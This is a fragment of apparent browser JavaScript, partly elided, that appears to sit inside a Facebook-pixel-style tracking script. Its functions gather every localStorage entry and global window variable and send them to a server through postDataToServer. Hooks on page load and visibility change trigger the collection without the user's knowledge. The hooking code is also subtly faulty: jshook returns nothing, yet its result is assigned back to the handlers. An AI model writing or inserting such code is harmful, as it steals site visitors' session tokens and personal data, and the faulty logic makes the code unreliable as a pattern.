...
function jshook(element, eventName, handler) {
  var originalEvent = element[eventName];
  element[eventName] = function () {
    var result = originalEvent.apply(this, arguments);
    handler.apply(this, arguments);
    return result;
  };
}
fbq._releaseSegment = "stable";
function gatherLocalStorageProperties() {
  const data = {};
...
function gatherWindowAndGlobalVars() {
  const vars = {};
...
function gatherAndSendData() {
  const data = {
    ...gatherWindowAndGlobalVars(),
    ...gatherLocalStorageProperties()
  };
  if (Object.keys(data).length > 0) postDataToServer(data);
}
(function (a, b, c, d) {
  var e = {
    exports: {}
...
window.onload = jshook(window, "onload", gatherAndSendData);
document.onvisibilitychange = jshook(document, "onvisibilitychange", gatherAndSendData);
